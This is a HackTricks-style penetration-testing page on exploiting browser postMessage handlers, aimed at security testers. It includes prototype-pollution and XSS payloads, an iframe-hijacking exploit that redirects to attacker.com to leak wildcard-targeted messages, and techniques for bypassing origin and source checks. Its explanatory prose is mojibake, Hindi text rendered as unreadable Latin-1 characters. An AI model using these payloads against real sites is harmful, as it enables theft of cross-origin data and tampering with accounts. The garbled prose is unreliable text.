# PostMessage Vulnerabilities

## PostMessage Vulnerabilities

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}


## Send **PostMessage**

**PostMessage** рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **targetOrigin** рдПрдХ '\*' рдпрд╛ рдПрдХ URL рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ _https://company.com._\
**рджреВрд╕рд░реЗ рдкрд░рд┐рджреГрд╢реНрдп** рдореЗрдВ, **рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ рдЙрд╕ рдбреЛрдореЗрди рдкрд░ рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рднрд▓реЗ рд╣реА рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдореВрд▓ рдЕрд▓рдЧ рд╣реЛ).\
рдпрджрд┐ **wildcard** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╕рдВрджреЗрд╢ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдкрд░ рднреЗрдЬреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рдпрд╣ рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдореВрд▓ рдкрд░ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗред

### Attacking iframe & wildcard in **targetOrigin**

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрджрд┐ рдЖрдк рдПрдХ рдкреГрд╖реНрда рдкрд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ **iframed** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдХреЛрдИ `X-Frame-Header` рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ) рдФрд░ рдЬреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рдВрджреЗрд╢ рдХреЛ **postMessage** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **wildcard** (\*) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **iframe** рдХреЗ **origin** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рдВрджреЗрд╢ рдХреЛ рдПрдХ рдбреЛрдореЗрди рдкрд░ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдкреГрд╖реНрда рдХреЛ iframed рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **targetOrigin** **рдПрдХ URL рдкрд░ рд╕реЗрдЯ рд╣реИ рдФрд░ wildcard рдкрд░ рдирд╣реАрдВ**, рддреЛ рдпрд╣ **рдЪрд╛рд▓ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреА**ред
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener рд╢реЛрд╖рдг

**`addEventListener`** рд╡рд╣ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ JS рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ рдЬреЛ **`postMessages`** рдХреА **рдЙрдореНрдореАрдж рдХрд░ рд░рд╣рд╛ рд╣реИ**ред\
рдЗрд╕рд╕реЗ рдорд┐рд▓рддреА-рдЬреБрд▓рддреА рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдХреЛрдб рдХрд╛ **рдкрд╣рд▓рд╛ рдХрд╛рдо** **рдЙрддреНрдкрддреНрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛** рд╣реИред рдпрд╣ рдмрд╣реБрдд **рдорд╣рддреНрд╡рдкреВрд░реНрдг** рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдпрджрд┐ рдкреГрд╖реНрда рдкреНрд░рд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде **рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрдп** рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (рдЬреИрд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдирд╛)ред **рдпрджрд┐ рдпрд╣ рдЙрддреНрдкрддреНрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рддреЛрдВ рдХреЛ рдЗрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдкрд░ рдордирдорд╛рдирд╛ рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдкреАрдбрд╝рд┐рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ)ред

### Enumeration

рд╡рд░реНрддрдорд╛рди рдкреГрд╖реНрда рдореЗрдВ **рдЗрд╡реЗрдВрдЯ рд▓рд┐рд╕реНрдирд░реНрд╕** рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **JS рдХреЛрдб рдореЗрдВ** `window.addEventListener` рдФрд░ `$(window).on` (_JQuery рд╕рдВрд╕реНрдХрд░рдг_) рдХреЗ рд▓рд┐рдП **рдЦреЛрдЬреЗрдВ**
* рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдХрдВрд╕реЛрд▓ рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ**: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдореЗрдВ _Elements --> Event Listeners_ рдкрд░ **рдЬрд╛рдПрдВ**

![](<../../.gitbook/assets/image (396).png>)

* рдПрдХ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреИрд╕реЗ [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) рдпрд╛ [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)ред рдпреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди **рд╕рднреА рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ** рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЖрдкрдХреЛ рджрд┐рдЦрд╛рдПрдВрдЧреЗред

### Origin check bypasses

* **`event.isTrusted`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рдЙрди рдШрдЯрдирд╛рдУрдВ рдХреЗ рд▓рд┐рдП `True` рд▓реМрдЯрд╛рддрд╛ рд╣реИ рдЬреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЗрд╕реЗ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рдП рддреЛ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рд╣реИ, рдЗрд╕рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЛрдВ рдореЗрдВ рдорд╣рддреНрд╡ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИред
*   **`indexOf()`** рдХрд╛ рдЙрдкрдпреЛрдЧ PostMessage рдШрдЯрдирд╛рдУрдВ рдореЗрдВ рдЙрддреНрдкрддреНрддрд┐ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   `String.prototype.search()` рд╕реЗ **`search()`** рд╡рд┐рдзрд┐ рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИ, рди рдХрд┐ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЗ рд▓рд┐рдПред рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЛ regexp рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдкрд╛рд╕ рдХрд░рдиреЗ рд╕реЗ regex рдореЗрдВ рдирд┐рд╣рд┐рдд рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рдзрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛ рдЬрд╛рддреА рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ regex рдореЗрдВ, рдПрдХ рдмрд┐рдВрджреБ (.) рдПрдХ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЧрдП рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рд╕рддреНрдпрд╛рдкрди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* **`match()`** рдлрд╝рдВрдХреНрд╢рди, `search()` рдХреЗ рд╕рдорд╛рди, regex рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ regex рдареАрдХ рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рдпрд╣ рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
*   **`escapeHtml`** рдлрд╝рдВрдХреНрд╢рди рдЗрдирдкреБрдЯ рдХреЛ рд╕реНрд╡рдЪреНрдЫ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд░реНрдгреЛрдВ рдХреЛ рдПрд╕реНрдХреЗрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдПрдХ рдирдпрд╛ рдПрд╕реНрдХреЗрдк рдХрд┐рдпрд╛ рдЧрдпрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИ рдмрд▓реНрдХрд┐ рдореМрдЬреВрджрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдпрджрд┐ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╣реЗрд░рдлреЗрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕рдХреА рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреНрд░реЙрдкрд░реНрдЯреА `hasOwnProperty` рдХреЛ рдорд╛рдиреНрдпрддрд╛ рдирд╣реАрдВ рджреЗрддреА рд╣реИ, рддреЛ `escapeHtml` рдЕрдкреЗрдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХрд╛рд░реНрдп рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред рдпрд╣ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

*   рдЕрдкреЗрдХреНрд╖рд┐рдд рд╡рд┐рдлрд▓рддрд╛:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   рдПрд╕реНрдХреЗрдк рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, `File` рдСрдмреНрдЬреЗрдХреНрдЯ рдЕрдкрдиреЗ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ `name` рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЗ рдХрд╛рд░рдг рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИред рдЗрд╕ рдкреНрд░реЙрдкрд░реНрдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕реЗ `escapeHtml` рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪреНрдЫ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВред
* JavaScript рдореЗрдВ `document.domain` рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ рдбреЛрдореЗрди рдХреЛ рдЫреЛрдЯрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдорд╛рди рдореВрд▓ рдиреАрддрд┐ рдкреНрд░рд╡рд░реНрддрди рдореЗрдВ рдЕрдзрд┐рдХ рдвреАрд▓ рджреА рдЬрд╛ рд╕рдХреЗред

### e.origin == window.origin рдмрд╛рдпрдкрд╛рд╕

рдЬрдм %%%%%% рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб iframe** рдХреЗ рднреАрддрд░ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЛ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ iframe рдХреА рдЙрддреНрдкрддреНрддрд┐ `null` рдкрд░ рд╕реЗрдЯ рдХреА рдЬрд╛рдПрдЧреАред рдпрд╣ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ** рдФрд░ рдЙрдирдХреА рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рдиреЗ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдореЗрдВ **`allow-popups`** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рд╕реЗ, iframe рдХреЗ рднреАрддрд░ рд╕реЗ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рдХреЛрдИ рднреА рдкреЙрдкрдЕрдк рд╡рд┐рдВрдбреЛ рдЕрдкрдиреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдХреА рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬрдм рддрдХ **`allow-popups-to-escape-sandbox`** рд╡рд┐рд╢реЗрд╖рддрд╛ рднреА рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА, рдкреЙрдкрдЕрдк рд╡рд┐рдВрдбреЛ рдХреА рдЙрддреНрдкрддреНрддрд┐ рднреА `null` рдкрд░ рд╕реЗрдЯ рд╣реЛрддреА рд╣реИ, рдЬреЛ iframe рдХреА рдЙрддреНрдкрддреНрддрд┐ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдЬрдм рдЗрди рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рддрд╣рдд рдПрдХ рдкреЙрдкрдЕрдк рдЦреЛрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ iframe рд╕реЗ рдкреЙрдкрдЕрдк рдореЗрдВ **`postMessage`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рджреЛрдиреЛрдВ рдкрдХреНрд╖реЛрдВ рдХреА рдЙрддреНрдкрддреНрддрд┐ `null` рдкрд░ рд╕реЗрдЯ рд╣реЛрддреА рд╣реИред рдпрд╣ рд╕реНрдерд┐рддрд┐ рдПрдХ рдкрд░рд┐рджреГрд╢реНрдп рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддреА рд╣реИ рдЬрд╣рд╛рдВ **`e.origin == window.origin`** рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ (`null == null`), рдХреНрдпреЛрдВрдХрд┐ iframe рдФрд░ рдкреЙрдкрдЕрдк рджреЛрдиреЛрдВ рдХрд╛ рдЙрддреНрдкрддреНрддрд┐ рдорд╛рди `null` рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкрдврд╝реЗрдВ**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рдВрджреЗрд╢ рдЙрд╕реА рд╡рд┐рдВрдбреЛ рд╕реЗ рдЖрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реБрди рд░рд╣реА рд╣реИ (рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреЛрдВ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕** рдХреЗ рд▓рд┐рдП рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╕рдВрджреЗрд╢ рдЙрд╕реА рдкреГрд╖реНрда рд╕реЗ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛):
```javascript
// If itтАЩs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
рдЖрдк **`e.source`** рдХреЛ null рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **iframe** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **postMessage** рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ **рддреБрд░рдВрдд рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкрдврд╝реЗрдВ:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header рдмрд╛рдпрдкрд╛рд╕

рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рдЖрдк **рд╢рд┐рдХрд╛рд░ рд╡реЗрдм рдкреГрд╖реНрда** рдХреЛ рдПрдХ `iframe` рдХреЗ рдЕрдВрджрд░ рд░рдЦ рдкрд╛рдПрдВрдЧреЗред рд▓реЗрдХрд┐рди рдХреБрдЫ рд╣реЗрдбрд░ рдЬреИрд╕реЗ `X-Frame-Header` рдЙрд╕ **рд╡реНрдпрд╡рд╣рд╛рд░** рдХреЛ **рд░реЛрдХ** рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ, рдЖрдк рдЕрднреА рднреА рдПрдХ рдХрдо рдЫрд┐рдкреЗ рд╣реБрдП рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдХрдордЬреЛрд░ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдЯреИрдм рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
